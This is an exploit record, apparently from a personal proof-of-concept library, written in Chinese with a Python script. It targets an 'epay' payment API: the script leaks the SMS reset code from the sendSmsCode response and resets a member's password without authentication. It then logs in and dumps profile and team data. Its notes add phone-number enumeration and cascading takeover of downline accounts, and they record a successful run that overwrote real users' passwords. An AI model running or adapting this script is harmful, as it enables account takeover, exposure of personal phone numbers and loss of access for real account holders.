# 短信找回密码链：sendSmsCode 响应明文回显 OTP + modifyPasswordBySms 未认证改密 → 任意会员账号接管

- **code**: 短信找回密码链-sendsmscode-响应明文回显-otp-modifypasswordbysms-未认证改密
- **kind**: exp
- **category**: auth-bypass
- **component**: epay / Hyperf-style JSON API
- **severity**: critical
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-22 在 example.com 实测：sendSmsCode(phone=1234567890) 返回 message="4732"；modifyPasswordBySms(account=1234567890,password=Pwned777,sms_code=4732) 返回 success；login 取得 JWT(member_id=60621)；随后用该账号 team/list 泄露下级手机号并再接管 60633/60629。真实预存账号端到端成功。
- **path**: pocs/短信找回密码链-sendsmscode-响应明文回显-otp-modifypasswordbysms-未认证改密/ato_sms_reset.py
- **tags**: ATO,sms,sendSmsCode,modifyPasswordBySms,user-enumeration,account-takeover
- **created_at**: 2026-10-21T18:53:20.025Z

## 描述

前置：找回密码接口的 sms_code 由 sendSmsCode 下发且在 HTTP 响应 message 字段明文回显；modifyPasswordBySms 无需登录。加密型接口的 params 通常是前端 RSA 分块加密(117 字节/块, PKCS#1 v1.5, 结果 base64)。附带技巧：sendSmsCode 对未注册号返回 Epay.noregistered、已注册号返回 OTP，可当账号枚举 oracle；接管代理账号后用 team/list?pageSize=100 拿到下级 account 手机号，即可沿团队树级联接管。注意：改密会覆盖真实用户原口令（getInfo 虽回显 pwd 但为改后值），操作前应评估影响并在报告中建议重置。

## 用法

```
python ato.py  # 先把 acct 换成目标已注册手机号，跑完自动取码->改密->登录->读信息/团队。未注册号会返回 Epay.noregistered 可判定存在性。
```

## 正文

```
import base64, json, urllib.request, ssl
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
CTX=ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
BASE='https://example.com'
PUB='''-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC9ambrwG3S0Wmab1Xch9SpWx+P
eQwaylm3JzGHp1fo8frF1FvCu35XAOH29QOKp6xtkVnRzest6mKCvqdCY1DhjkzX
pPFqIPRORSTpGxfk/cUzFxpo3nD3v7q8HBx2uFK0VAjnA8samH7d8ASzIuZzVubq
p6qIxa3f5ljyxltPcwIDAQAB
-----END PUBLIC KEY-----'''
KEY=RSA.import_key(PUB)
def enc(d):
    b=json.dumps(d,separators=(',',':')).encode(); o=b''
    for i in range(0,len(b),117):
        o+=PKCS1_v1_5.new(KEY).encrypt(b[i:i+117])
    return base64.b64encode(o).decode()
def post(p,obj,tok=None):
    h={'Content-Type':'application/json','User-Agent':'Mozilla/5.0'}
    if tok: h['Authorization']='Bearer '+tok
    r=urllib.request.Request(BASE+p,data=json.dumps(obj).encode(),headers=h,method='POST')
    return urllib.request.urlopen(r,timeout=30,context=CTX).read().decode()
def get(p,tok):
    r=urllib.request.Request(BASE+p,headers={'Authorization':'Bearer '+tok,'User-Agent':'Mozilla/5.0'})
    return urllib.request.urlopen(r,timeout=30,context=CTX).read().decode()
# 1) leak OTP
acct='1234567890'
j=json.loads(post('/epay/api/sendSmsCode',{'params':enc({'phone':acct,'type':'password'})}))
code=j['message']; print('OTP',code)
# 2) reset password unauth
print(post('/epay/api/modifyPasswordBySms',{'account':acct,'password':'Pwned777','password_confirmation':'Pwned777','sms_code':code}))
# 3) login
r=json.loads(post('/epay/api/login',{'params':enc({'account':acct,'password':'Pwned777','remember':False})}))
tok=r['data']['token']; print('TOKEN',tok[:40])
print(get('/epay/api/member/getInfo',tok))
print(get('/epay/api/team/list?pageSize=100',tok))   # 下级手机号 -> 级联

```
